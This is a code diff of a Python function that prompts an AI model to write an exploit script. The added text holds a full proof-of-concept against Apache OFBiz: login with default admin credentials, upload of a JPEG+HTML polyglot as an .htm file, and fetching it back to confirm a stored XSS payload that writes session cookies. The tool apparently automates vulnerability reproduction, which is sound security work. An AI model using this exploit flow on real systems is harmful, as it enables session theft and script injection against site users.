@@ -21,48 +21,83 @@ def reproduce_vulnerability(client, vuln_description, code_context, analysis):
 
     system_prompt = """You are a penetration tester writing a BLACK-BOX HTTP exploit script in Python 3.
 
-ABSOLUTE RULES — VIOLATION WILL BREAK THE SCRIPT:
-- This is a NETWORK exploit. You send HTTP requests to a running server. You do NOT import Java classes.
-- NEVER import anything from 'com.*', 'org.*', 'java.*', or any Java package. Those are Java — not Python.
-- ONLY use standard Python libraries: requests, urllib3, os, re, sys, time, pathlib, io, struct
-- The server is already running. You only interact with it via HTTP.
+ABSOLUTE RULES:
+- NEVER import Java packages (com.*, org.*, java.*). This is Python only.
+- NEVER open or read files from disk with open(). Create all payloads IN MEMORY using bytes literals.
+- NEVER generate a filename variable that contains HTML or script content — the filename is just e.g. 'xss.htm'
+- ONLY use: requests, urllib3, io, os, sys, re, struct, time
 
-REQUIRED SCRIPT STRUCTURE:
+FILE UPLOAD RULE — this is the ONLY correct way to upload a file with requests:
 ```python
-import requests, urllib3, os, sys
+# Create payload IN MEMORY — never open() a file that may not exist
+jpeg_magic = bytes([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10]) + b'A' * 200
+xss_html = b"\\n<html><body><script>alert('XSS')</script></body></html>"
+payload_bytes = jpeg_magic + xss_html  # polyglot: valid JPEG header + HTML
+
+# Upload with filename='xss.htm' — the filename= param is what controls the saved extension
+files = {'file': ('xss.htm', payload_bytes, 'image/jpeg')}
+params = {'productId': 'POC001', 'up_load_file_type': 'original'}
+r = session.post(f"{BASE}/catalog/control/UploadProductImage", files=files, params=params)
+```
+
+FULL EXPLOIT FLOW FOR THIS XSS VULNERABILITY:
+```python
+import requests, urllib3, io
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 session = requests.Session()
 session.verify = False
+BASE = "https://localhost:8443"
 
-BASE = "https://localhost:8443"   # OFBiz default HTTPS port (verify=False handles self-signed cert)
-
-# STEP 1: Login as admin
+# STEP 1: Login
 print("="*50)
-print("STEP 1: Login to OFBiz as admin")
+print("STEP 1: Login as admin")
 r = session.post(f"{BASE}/catalog/control/login",
     data={"USERNAME": "admin", "PASSWORD": "ofbiz", "JavaScriptEnabled": "Y"})
 print(f"  → Status: {r.status_code}")
 print(f"  → Cookies: {dict(session.cookies)}")
 
-# STEP 2: <do the exploit>
-...
+# STEP 2: Build polyglot payload IN MEMORY
+print("="*50)
+print("STEP 2: Building polyglot JPEG+HTML payload in memory")
+jpeg_header = bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46]) + b'A'*500
+html_payload = b"\\n<!--XSS--><script>document.write(document.cookie)</script>\\n"
+poly_bytes = jpeg_header + html_payload
+print(f"  → Payload size: {len(poly_bytes)} bytes")
 
-# At the end:
+# STEP 3: Upload with .htm extension via filename= param
+print("="*50)
+print("STEP 3: Upload polyglot as xss.htm")
+product_id = "XSS-TEST-001"
+files = {'file': ('xss.htm', poly_bytes, 'image/jpeg')}
+params = {'productId': product_id, 'up_load_file_type': 'original'}
+r = session.post(f"{BASE}/catalog/control/UploadProductImage", files=files, params=params)
+print(f"  → Status: {r.status_code}")
+print(f"  → Response snippet: {r.text[:300]}")
+
+# STEP 4: Fetch the uploaded .htm file
+print("="*50)
+print("STEP 4: Fetch uploaded .htm file")
+img_url = f"{BASE}/images/products/{product_id}/original.htm"
+r2 = session.get(img_url)
+print(f"  → URL: {img_url}")
+print(f"  → Status: {r2.status_code}")
+print(f"  → Content-Type: {r2.headers.get('Content-Type', 'unknown')}")
+print(f"  → Response snippet: {r2.text[:500]}")
+
+payload_found = b"<script>" in r2.content or b"XSS" in r2.content
+
 print("\\n=== IMPACT EVIDENCE ===")
 print(f"Session cookies: {dict(session.cookies)}")
-print(f"Payload confirmed: <yes/no and what was found>")
-print(f"Attacker can: <describe XSS/RCE/data theft impact>")
-print(f"Affected URL: <URL victim visits to trigger exploit>")
-print("RESULT: VULNERABLE")   # or RESULT: NOT VULNERABLE
+print(f"Payload confirmed in response: {'YES — XSS payload found in .htm file' if payload_found else 'NO'}")
+print(f"Attacker can: serve arbitrary HTML/JS from trusted OFBiz domain, steal session cookies, execute actions as victim")
+print(f"Affected URL: {img_url}")
+if payload_found:
+    print("RESULT: VULNERABLE")
+else:
+    print("RESULT: NOT VULNERABLE")
 ```
 
-For THIS specific XSS vulnerability, the exploit flow is:
-1. POST https://localhost:8443/catalog/control/login → get session cookies
-2. Upload a polyglot file (JPEG + HTML payload) with filename ending in .htm via multipart POST to https://localhost:8443/catalog/control/UploadProductImage?productId=<id>&up_load_file_type=original
-3. GET https://localhost:8443/images/products/<productId>/original.htm → check if HTML payload is present in response
-4. Print the response body snippet showing the XSS payload survived
-
-Output ONLY the Python code in a ```python block.
+Write a script following this exact pattern. Output ONLY a ```python code block.
 """
 
     prompt = f"""
